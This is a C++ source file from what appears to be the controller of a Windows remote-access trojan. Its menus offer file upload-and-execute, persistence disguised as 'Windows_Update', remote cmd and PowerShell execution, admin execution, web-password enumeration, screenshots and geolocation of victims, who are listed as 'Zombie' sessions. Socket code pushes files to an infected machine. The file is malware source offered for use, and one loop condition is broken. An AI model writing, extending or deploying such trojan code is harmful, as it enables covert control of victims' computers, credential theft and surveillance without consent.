#include "Scripts_s.h"

void Info::list_scripts()
{
	SetColor(2);
	std::cout << "[\t\t------------ List of all scripts ------------" << std::endl;
	SetColor(14);
	std::cout << "#---------------------------- Usefull -----------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ upload \"filename\"\t\t\t: upload a file in the current directory" << std::endl;
	std::cout << "[ upload_exe \"filename\"\t\t\t: upload and exe a file in the current directory" << std::endl;
	std::cout << "[ download \"filename\"\t\t\t: download the file's target wanted" << std::endl;
	std::cout << "[ download_dir \"filename\"\t\t: download the target directory" << std::endl;
	SetColor(14);
	std::cout << "#------------------------- System commands ------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ self_persistence <keyname>\t\t: Put a persistence on the payload" << std::endl;
	std::cout << "[ default name is Windows_Update" << std::endl;
	std::cout << "[ persistence <file_name> <keyname>\t: Put a persistence on a given file" << std::endl;
	std::cout << "[ default keyname is Windows_Update" << std::endl;
	std::cout << "[ cmd <command>\t\t\t\t: Run a command using cmd" << std::endl;
	std::cout << "[ powershell <command>\t\t\t:Run a command using powershell" << std::endl;
	std::cout << "[ exe_admin <file_name>\t\t\t: Execute a file (.exe) in admin mode" << std::endl;
	std::cout << "[ exe <file_name>\t\t\t: Execute a file" << std::endl;
	SetColor(14);
	std::cout << "#---------------------------- Exploit ------------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ geo\t\t\t\t: Give the localization of the current session" << std::endl;
	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session" << std::endl;
	std::cout << "[ screenshot <name>\t\t: Take a screenshot from the current target screen" << std::endl;
	std::cout << "[ ask <exe> <name>\t\t: Upload and execute a given file as administrator with a custom name" << std::endl;
	std::cout << "[ you can choose a new file_name, default is Windows_Update.exe" << std::endl;

	SetColor(7);
}

void Info::print_help()
{
	SetColor(2);
	std::cout << "[*] You have now acces to the payload\n" << std::endl;
	std::cout << "[\t\t------------ List of Commands ------------\t\t]" << std::endl;
	SetColor(6);
	std::cout << "[ help\t\t\t: list all commands" << std::endl;
	std::cout << "[ list_scripts\t\t: List all scripts available" << std::endl;
	std::cout << "[ version\t\t: print the current version and changes" << std::endl;
	std::cout << "[ getsysinfo\t\t: Give information about the current session (user ...)" << std::endl;
	std::cout << "[ getip\t\t\t: Give the External IP address of the current session" << std::endl;
	std::cout << "[ set_session\t\t: Switch to an another session" << std::endl;
	std::cout << "[ list\t\t\t: list all actives sessions" << std::endl;
	std::cout << "[ pwd\t\t\t: print the trojan emplacement" << std::endl;
	std::cout << "[ ls\t\t\t: see all files in the current directory" << std::endl;
	std::cout << "[ exit\t\t\t: exit the program" << std::endl;
	SetColor(7);
}

 bool Info::set_session(Server* server)
{
	int nb;
	server->send_b("[*] Please enter the number of the session : ");
	std::cin >> nb;
	std::vector<st_Client> clients = server->getClients();
	for (int i = 0; clients.size(); i++)
	{
		if (clients[i].number == nb)
		{
			server->setDefaultClient(server->getClients()[i]);
			server->send_b("[*] Done");
			return 1;
		}
	}
	server->send_b("[*] Can't find : ");
	server->send_b(nb);
	return 0;

}

 void Info::list(Server* server)
{
	SetColor(6);
	std::cout << "[*] Enumming clients..." << std::endl;
	SetColor(2);
	std::vector<st_Client> clients = server->getClients();
	for (int i = 0; i < clients.size(); i++)
	{
		std::cout << "Zombie " << clients[i].number << " Ip : " << clients[i].ip_extern <<  std::endl;
	}
	SetColor(7);

}

void Info::getsysinfo(Server* server)
{
	std::stringstream ss;

}


void SetColor(int value)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), value);
	/*
	1: Blue
	2 : Green
	3 : Cyan
	4 : Red
	5 : Purple
	6 : Yellow(Dark)
	7 : Default white
	8 : Gray / Grey
	9 : Bright blue
	10 : Brigth green
	11 : Bright cyan
	12 : Bright red
	13 : Pink / Magenta
	14 : Yellow
	15 : Bright white
	- Numbers after 15 are background colors -
	*/
}
void Transfer::uploadToClient(Server* serv1, const std::string filename)
{
	std::cout << "[*] Starting the upload of : " << filename << std::endl;
	char buffer[BUFFER_LEN] = { 0 };

	std::ifstream file(filename, std::ios::binary | std::ios::in);

	if (file)
	{
		SOCKET cl_sock = serv1->getDefaultClient().sock;
		const int len = 1024;
		std::cout << "Sending data ..." << std::endl;
		const int size = getSize(filename);
		std::cout << size << " bytes to send" << std::endl;
		serv1->send_b(size);
		int current_size = 0;
		char memblock[len] = { 0 };
		const int rest = size % len;
		Sleep(2000);
		int nb = 0;
		file.seekg(0, std::ios::beg);
		bool done = 0;
		int pourcentage = 0;
		std::thread t_refresh(refresh, &done,200,&pourcentage);

		while (current_size != size)
		{
			if (current_size+rest==size)
			{
				file.read(memblock, rest);
				send(cl_sock, memblock, rest, 0);
				break;
			}
			else
			{
				file.read(memblock, len);
				send(cl_sock, memblock, len, 0);
				current_size += len;
				file.seekg(current_size, std::ios::beg);
			}
			pourcentage = current_size * 100;
			pourcentage = pourcentage / size;
		}
		done = 1;
		t_refresh.join();
		std::cout << "[*] Done" << std::endl;
	}
	else
	{
		serv1->send_b("STOP");
		std::cout << "[*] Error can\'t open file : " << filename << std::endl;
	}
}

int Transfer::getSize(std::string filename)
{
	std::ifstream file(filename, std::ios::binary);
	if (file)
	{
		std::streampos beg, end;
		beg = file.tellg();
		file.seekg(0, std::ios::end);
		end = file.tellg();
		file.close();
		return (end - beg);
	}
	else
		return 0;

}
